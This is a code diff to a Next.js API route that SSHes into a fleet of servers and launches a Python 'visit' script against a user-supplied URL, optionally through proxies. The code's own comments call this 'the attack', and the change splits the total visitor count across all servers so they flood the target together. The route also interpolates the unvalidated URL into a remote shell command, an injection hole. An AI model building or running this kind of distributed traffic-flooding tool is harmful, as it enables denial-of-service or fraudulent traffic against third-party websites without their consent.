@@ -96,8 +96,11 @@ export async function POST(req) {
 
     } else if (action === 'start') {
       if (!url) return NextResponse.json({ error: "URL is required" }, { status: 400 });
-      const v = visitors || 100;
+      const totalVisitors = visitors || 100;
       const d = duration || 5;
+      const serverCount = serverList.length;
+      // Divide total visitors across all servers
+      const perServer = Math.ceil(totalVisitors / serverCount);
 
       // Step 1: Kill old processes and clean up on all servers
       await Promise.all(
@@ -113,15 +116,15 @@ export async function POST(req) {
         })
       );
 
-      // Step 3: Start the attack with nohup (simple command, no bash -c wrapper)
+      // Step 3: Start the attack - each server gets (totalVisitors / serverCount) visitors
       const results = await Promise.all(
         serverList.map(async (server) => {
           let startCmd;
           if (proxies && proxies.length > 0) {
             const proxyB64 = Buffer.from(JSON.stringify(proxies)).toString('base64');
-            startCmd = `echo "${proxyB64}" | base64 -d > /root/proxies.json && nohup python3 /root/visit.py "${url}" ${v} ${d} /root/proxies.json > /root/visit.log 2>&1 & echo "Started PID=$!"`;
+            startCmd = `echo "${proxyB64}" | base64 -d > /root/proxies.json && nohup python3 /root/visit.py "${url}" ${perServer} ${d} /root/proxies.json > /root/visit.log 2>&1 & echo "Started PID=$!"`;
           } else {
-            startCmd = `nohup python3 /root/visit.py "${url}" ${v} ${d} > /root/visit.log 2>&1 & echo "Started PID=$!"`;
+            startCmd = `nohup python3 /root/visit.py "${url}" ${perServer} ${d} > /root/visit.log 2>&1 & echo "Started PID=$!"`;
           }
           const r = await runSSHCommand(server, startCmd, 10000);
           return { host: server.host, ...r };
